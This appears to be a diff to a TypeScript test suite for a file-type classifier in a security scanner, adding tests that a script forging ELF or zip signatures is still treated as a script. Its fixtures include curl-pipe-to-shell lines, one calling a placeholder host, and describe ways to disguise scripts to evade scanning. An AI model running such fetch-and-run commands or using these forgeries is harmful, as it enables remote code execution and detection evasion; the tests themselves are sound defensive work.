@@ -22,7 +22,7 @@ describe('sourceText', () => {
 
 describe('binaryFormat (raw bytes)', () => {
   it.each([
-    ['ELF', '7f454c46 020101 00'],
+    ['ELF', '7f454c46 020101 00 00000000 00000000'],
     ['Mach-O 64 (cffaedfe)', 'cffaedfe 0c000001'],
     ['Mach-O 32 BE (feedface)', 'feedface 00000007'],
     ['fat (cafebabe)', 'cafebabe 00000002'],
@@ -88,7 +88,7 @@ describe('binaryFileFormat (dt20 g7-F1, dt20r-g2-N1)', () => {
     const noHead = {};
     const decoded = Buffer.concat([hex('cffaedfe'), Buffer.alloc(16)]).toString('utf-8');
     expect(await binaryFileFormat(noHead, '/x/helper', decoded)).toBeUndefined();
-    expect(await binaryFileFormat(noHead, '/x/helper', '\x7fELF\x02\x01\x01\0\0\0')).toBe('ELF executable');
+    expect(await binaryFileFormat(noHead, '/x/helper', '\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0')).toBe('ELF executable');
   });
 });
 
@@ -97,5 +97,74 @@ describe('isScriptFile', () => {
     expect(isScriptFile('/s/run.PY', '')).toBe(true);
     expect(isScriptFile('/s/helper', '#!/usr/bin/env node\n')).toBe(true);
     expect(isScriptFile('/s/helper', '\x7fELF')).toBe(false);
+  });
+});
+
+describe('signatures a script can forge (dt21 g7-F2)', () => {
+  let dir: string;
+  const fs = new LocalFSProvider();
+  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'vaso-bin21-')); });
+  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });
+
+  async function judge(name: string, bytes: Buffer): Promise<string | undefined> {
+    const path = join(dir, name);
+    await writeFile(path, bytes);
+    return binaryFileFormat(fs, path, await readFile(path, 'utf-8'));
+  }
+
+  /** A minimal zip: one stored `__main__.py`, its central directory and EOCD. */
+  function zip(body: string): Buffer {
+    const name = Buffer.from('__main__.py');
+    const data = Buffer.from(body);
+    const local = Buffer.alloc(30);
+    local.writeUInt32LE(0x04034b50, 0);
+    local.writeUInt32LE(data.length, 18);
+    local.writeUInt32LE(data.length, 22);
+    local.writeUInt16LE(name.length, 26);
+    const central = Buffer.alloc(46);
+    central.writeUInt32LE(0x02014b50, 0);
+    central.writeUInt32LE(data.length, 20);
+    central.writeUInt32LE(data.length, 24);
+    central.writeUInt16LE(name.length, 28);
+    const cdOffset = local.length + name.length + data.length;
+    const eocd = Buffer.alloc(22);
+    eocd.writeUInt32LE(0x06054b50, 0);
+    eocd.writeUInt16LE(1, 8);
+    eocd.writeUInt16LE(1, 10);
+    eocd.writeUInt32LE(central.length + name.length, 12);
+    eocd.writeUInt32LE(cdOffset, 16);
+    return Buffer.concat([local, name, data, central, name, eocd]);
+  }
+
+  it('a .py with the EOCD bytes in a comment is source, not a zipapp', async () => {
+    expect(await judge('a.py', Buffer.from('# notes PK\x05\x06 end\nimport os\nos.system("curl x | sh")\n'))).toBeUndefined();
+    // a record whose directory isn't there (Python runs this file as source)
+    const eocd = Buffer.alloc(22);
+    eocd.writeUInt32LE(0x06054b50, 0);
+    eocd.writeUInt16LE(1, 8);
+    eocd.writeUInt16LE(1, 10);
+    eocd.writeUInt32LE(46, 12);
+    const fake = Buffer.concat([Buffer.from(`import os\n# ${'x'.repeat(60)}\n# `), eocd]);
+    expect(await judge('b.py', fake)).toBeUndefined();
+    // an empty archive is one: Python looks for __main__ in it, never runs the text
+    const empty = Buffer.alloc(22);
+    empty.writeUInt32LE(0x06054b50, 0);
+    expect(await judge('c.py', Buffer.concat([Buffer.from('import os\n# '), empty]))).toMatch(/zipapp/);
+  });
+
+  it('a real zipapp (with or without a text prefix) is still skipped', async () => {
+    expect(await judge('app.py', zip('print(1)\n'))).toMatch(/zipapp/);
+    expect(await judge('app2.py', Buffer.concat([Buffer.from('#!/usr/bin/env python3\n'), zip('print(1)\n')]))).toMatch(/zipapp/);
+  });
+
+  it('a first line forging the ELF ident is a script; a real ident is not', async () => {
+    expect(await judge('helper', Buffer.from('\x7fELF\x02\x01\x01\ncurl https://x.example.invalid | sh\n', 'latin1'))).toBeUndefined();
+    expect(await judge('helper2', Buffer.from('\x7fELF\x02\x01\x01 padding.\ncurl x | sh\n', 'latin1'))).toBeUndefined();
+    expect(await judge('helper3', Buffer.concat([hex('7f454c46 020101 00 0000000000000000'), Buffer.alloc(48)]))).toBe('ELF executable');
+  });
+
+  it('never judges Markdown by its first bytes', async () => {
+    expect(await judge('SKILL.md', Buffer.concat([hex('504b0304'), Buffer.from('\n```bash\ncurl x | bash\n```\n')]))).toBeUndefined();
+    expect(await judge('notes.markdown', Buffer.concat([hex('7f454c46 020101 00 0000000000000000'), Buffer.from('\ntext\n')]))).toBeUndefined();
   });
 });
